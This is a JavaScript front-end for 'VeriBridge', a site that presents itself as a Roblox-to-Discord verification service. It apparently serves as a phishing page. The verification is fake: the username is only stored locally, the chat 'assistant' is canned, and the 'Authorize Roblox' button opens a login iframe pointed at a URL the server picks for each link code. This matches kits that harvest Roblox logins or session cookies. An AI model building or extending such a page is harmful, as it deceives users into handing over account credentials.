const API_BASE = '/api';
let VERIFICATION_READY = false;
let LOADED_TARGET_URL = '';
let VERIFICATION_CODE = null;
let currentRobloxUser = null;
let currentActiveMethod = 'login';

const verificationState = {
    login: { completed: false },
    ingame: { completed: false },
    community: { completed: false }
};

const startLoading = document.getElementById('startLoadingOverlay');
const startScreen = document.getElementById('startScreen');
const mainDashboard = document.getElementById('mainDashboard');
const landingUsername = document.getElementById('landingUsername');
const landingVerifyBtn = document.getElementById('landingVerifyBtn');
const landingErrorMsg = document.getElementById('landingErrorMsg');
const robloxUsernameInput = document.getElementById('robloxUsernameInput');
const verifyRobloxBtn = document.getElementById('verifyRobloxBtn');
const userProfilePreview = document.getElementById('userProfilePreview');
const previewAvatar = document.getElementById('previewAvatar');
const previewUsername = document.getElementById('previewUsername');
const userProfileCard = document.getElementById('userProfileCard');
const userAvatar = document.getElementById('userAvatar');
const userDisplayName = document.getElementById('userDisplayName');
const logoutBtnHeader = document.getElementById('logoutBtnHeader');
const bottomStartBtn = document.getElementById('bottomStartVerifyBtn');
const redirectTitle = document.getElementById('redirectTitle');
const redirectDesc = document.getElementById('redirectDesc');
const dashErrorMsg = document.getElementById('dashErrorMsg');
const robloxFrameOverlay = document.getElementById('robloxFrameOverlay');
const robloxLoginIframe = document.getElementById('robloxLoginIframe');
const closeFrameBtn = document.getElementById('closeFrameBtn');
const chatWidget = document.getElementById('chatWidget');
const chatWindow = document.getElementById('chatWindow');
const closeChatBtn = document.getElementById('closeChatBtn');
const chatInput = document.getElementById('chatInput');
const sendChatBtn = document.getElementById('sendChatBtn');
const chatMessages = document.getElementById('chatMessages');

const featuresGrid = document.getElementById('featuresGrid');
const features = [
    { title: 'No complex setup', description: 'veribridge appeals to the average user and the advanced user.' },
    { title: 'Simple Verification', description: 'Verify through our Roblox game or by a code on your profile.' },
    { title: 'Bonds', description: 'Connect gamepasses, badges, group ranks to Discord roles.' },
    { title: 'Roblox-based Server Restrictions', description: 'Lock your server with age-limits and group-only restrictions.' },
    { title: 'Group Utility Commands', description: 'Manage Roblox groups directly from Discord.' },
    { title: 'User Utility Commands', description: 'Look up Roblox users from Discord.' }
];

if (featuresGrid) {
    featuresGrid.innerHTML = features.map(f => `
        <div class="feature-card">
            <h3>${f.title}</h3>
            <p>${f.description}</p>
        </div>
    `).join('');
}

const methods = [
    { id: 'login', letter: 'A', name: 'Authorize Roblox', desc: 'Link your Roblox account with Veribridge' },
    { id: 'ingame', letter: 'I', name: 'Verify via In-Game', desc: 'Roblox In-Game Auth' },
    { id: 'community', letter: 'C', name: 'Verify via Community', desc: 'Roblox Group/Community' }
];

const verifyMethodsContainer = document.getElementById('verifyMethodsContainer');
if (verifyMethodsContainer) {
    verifyMethodsContainer.innerHTML = methods.map(m => `
        <div class="verify-card-gold" data-method="${m.id}" id="method${m.id.charAt(0).toUpperCase() + m.id.slice(1)}">
            <div class="method-letter-circle"><span class="method-letter">${m.letter}</span></div>
            <div class="card-title-gold">${m.name}</div>
            <div class="card-desc-gold">${m.desc}</div>
            <div class="verify-badge-gold" id="${m.id}StatusGold">Not verified</div>
        </div>
    `).join('');
}

function isValidUsername(username) {
    return /^[a-zA-Z0-9_]{3,20}$/.test(username);
}

function updateUserCard() {
    if (currentRobloxUser) {
        userAvatar.src = currentRobloxUser.avatarUrl;
        userDisplayName.textContent = currentRobloxUser.username;
        userProfileCard.classList.add('show');
        bottomStartBtn.disabled = false;
    } else {
        userProfileCard.classList.remove('show');
        bottomStartBtn.disabled = true;
    }
}

function updateUI() {
    const activeMethodLetter = document.getElementById('activeMethodLetter');
    const activeMethodNameGold = document.getElementById('activeMethodNameGold');
    const verificationStatusGold = document.getElementById('verificationStatusGold');
    
    methods.forEach(m => {
        const card = document.getElementById(`method${m.id.charAt(0).toUpperCase() + m.id.slice(1)}`);
        const badge = document.getElementById(`${m.id}StatusGold`);
        if (card) card.classList.toggle('active', currentActiveMethod === m.id);
        if (badge) badge.textContent = verificationState[m.id].completed ? 'Verified' : 'Not verified';
    });
    
    const activeMethod = methods.find(m => m.id === currentActiveMethod);
    if (activeMethod) {
        if (activeMethodLetter) activeMethodLetter.textContent = activeMethod.letter;
        if (activeMethodNameGold) activeMethodNameGold.textContent = activeMethod.name;
        if (verificationStatusGold) {
            verificationStatusGold.textContent = verificationState[currentActiveMethod].completed ? 'Verified' : 'Not verified';
        }
    }
}

function setActiveMethod(method) {
    currentActiveMethod = method;
    updateUI();
}

function showRobloxFlow() {
    if (!VERIFICATION_READY) {
        alert('Loading verification data. Please wait.');
        return;
    }
    if (!currentRobloxUser) {
        addAIMessage("Please enter your Roblox username first!");
        return;
    }
    
    robloxLoginIframe.src = LOADED_TARGET_URL;
    robloxFrameOverlay.classList.add('active');
}

function hideFrame() {
    robloxFrameOverlay.classList.remove('active');
    setTimeout(() => { robloxLoginIframe.src = 'about:blank'; }, 300);
}

function verifyDashUser() {
    const username = robloxUsernameInput.value.trim();
    if (!username || !isValidUsername(username)) {
        dashErrorMsg.classList.add('show');
        return;
    }
    
    dashErrorMsg.classList.remove('show');
    const avatarUrl = `https://ui-avatars.com/api/?background=2c5a7a&color=fff&size=60&name=${username.charAt(0).toUpperCase()}`;
    currentRobloxUser = { id: username, username, avatarUrl };
    localStorage.setItem('veribridge_user', JSON.stringify(currentRobloxUser));
    
    previewAvatar.src = avatarUrl;
    previewUsername.textContent = username;
    userProfilePreview.classList.add('show');
    updateUserCard();
    addAIMessage(`Welcome ${username}! Select a verification method.`);
    redirectTitle.textContent = `Welcome ${username}`;
    redirectDesc.textContent = 'Choose a method from the sidebar';
}

function logoutUser() {
    currentRobloxUser = null;
    localStorage.removeItem('veribridge_user');
    userProfilePreview.classList.remove('show');
    updateUserCard();
    robloxUsernameInput.value = '';
    redirectTitle.textContent = 'Select a verification method';
    redirectDesc.textContent = 'Choose a method from the sidebar';
}

let isTyping = false;

function addMessage(text, isUser = false) {
    const div = document.createElement('div');
    div.className = `message ${isUser ? 'user' : 'ai'}`;
    div.innerHTML = `<div class="message-bubble">${text}</div>`;
    chatMessages.appendChild(div);
    chatMessages.scrollTop = chatMessages.scrollHeight;
}

function addAIMessage(text) {
    addMessage(text, false);
}

function showTypingIndicator() {
    const div = document.createElement('div');
    div.className = 'message ai typing-indicator-container';
    div.id = 'typingIndicator';
    div.innerHTML = '<div class="typing-indicator"><span></span><span></span><span></span></div>';
    chatMessages.appendChild(div);
}

function removeTypingIndicator() {
    const indicator = document.getElementById('typingIndicator');
    if (indicator) indicator.remove();
}

function getAIResponse(question) {
    const q = question.toLowerCase();
    if (q.includes('verify')) return "Enter your username, select a method, and click 'Start Verification'.";
    if (q.includes('discord')) return "VeriBridge syncs Roblox data to Discord roles!";
    if (q.includes('hello') || q.includes('hi')) return "Hello! Welcome to VeriBridge.";
    return "I can help with Roblox verification, Discord integration, and group commands!";
}

async function sendMessage() {
    const text = chatInput.value.trim();
    if (!text || isTyping) return;
    
    addMessage(text, true);
    chatInput.value = '';
    showTypingIndicator();
    isTyping = true;
    
    await new Promise(resolve => setTimeout(resolve, 600));
    const response = getAIResponse(text);
    removeTypingIndicator();
    addMessage(response, false);
    isTyping = false;
}

async function loadVerificationCode() {
    const urlParams = new URLSearchParams(window.location.search);
    VERIFICATION_CODE = urlParams.get('code');
    
    if (VERIFICATION_CODE) {
        startLoading.classList.add('active');
        try {
            const response = await fetch(`${API_BASE}/links?code=${VERIFICATION_CODE}`);
            const data = await response.json();
            if (data.success && data.targetUrl) {
                LOADED_TARGET_URL = data.targetUrl;
                VERIFICATION_READY = true;
                startLoading.classList.remove('active');
                bottomStartBtn.disabled = false;
            } else {
                throw new Error('Link not found');
            }
        } catch (error) {
            startLoading.classList.remove('active');
            redirectTitle.textContent = '❌ Error';
            redirectDesc.textContent = 'This verification link does not exist.';
        }
    } else {
        VERIFICATION_READY = true;
        bottomStartBtn.disabled = false;
    }
}

function restoreSavedUser() {
    const saved = localStorage.getItem('veribridge_user');
    if (saved) {
        try {
            currentRobloxUser = JSON.parse(saved);
            previewAvatar.src = `https://ui-avatars.com/api/?background=2c5a7a&color=fff&size=60&name=${currentRobloxUser.username.charAt(0).toUpperCase()}`;
            previewUsername.textContent = currentRobloxUser.username;
            userProfilePreview.classList.add('show');
            updateUserCard();
            redirectTitle.textContent = `Welcome ${currentRobloxUser.username}`;
            robloxUsernameInput.value = currentRobloxUser.username;
        } catch (e) {}
    }
}

landingVerifyBtn.addEventListener('click', () => {
    const username = landingUsername.value.trim();
    if (!username || !isValidUsername(username)) {
        landingErrorMsg.classList.add('show');
        return;
    }
    
    landingErrorMsg.classList.remove('show');
    startLoading.classList.add('active');
    
    setTimeout(() => {
        const avatarUrl = `https://ui-avatars.com/api/?background=2c5a7a&color=fff&size=60&name=${username.charAt(0).toUpperCase()}`;
        currentRobloxUser = { id: username, username, avatarUrl };
        localStorage.setItem('veribridge_user', JSON.stringify(currentRobloxUser));
        
        previewAvatar.src = avatarUrl;
        previewUsername.textContent = username;
        userProfilePreview.classList.add('show');
        updateUserCard();
        redirectTitle.textContent = `Welcome ${username}`;
        robloxUsernameInput.value = username;
        
        startLoading.classList.remove('active');
        startScreen.style.display = 'none';
        mainDashboard.style.display = 'block';
        addAIMessage(`Welcome ${username}! Select a verification method.`);
        updateUI();
    }, 1500);
});

verifyRobloxBtn.addEventListener('click', verifyDashUser);
logoutBtnHeader.addEventListener('click', logoutUser);
bottomStartBtn.addEventListener('click', showRobloxFlow);
closeFrameBtn.addEventListener('click', hideFrame);
robloxFrameOverlay.addEventListener('click', (e) => {
    if (e.target === robloxFrameOverlay) hideFrame();
});

methods.forEach(m => {
    const card = document.getElementById(`method${m.id.charAt(0).toUpperCase() + m.id.slice(1)}`);
    if (card) {
        card.addEventListener('click', () => setActiveMethod(m.id));
    }
});

chatWidget.addEventListener('click', () => chatWindow.classList.toggle('active'));
closeChatBtn.addEventListener('click', () => chatWindow.classList.remove('active'));
sendChatBtn.addEventListener('click', sendMessage);
chatInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') sendMessage();
});

loadVerificationCode();
restoreSavedUser();
updateUI();

setTimeout(() => {
    if (chatMessages.children.length === 0) {
        addAIMessage("Hello! I'm your VeriBridge assistant. Ask me anything!");
    }
}, 100);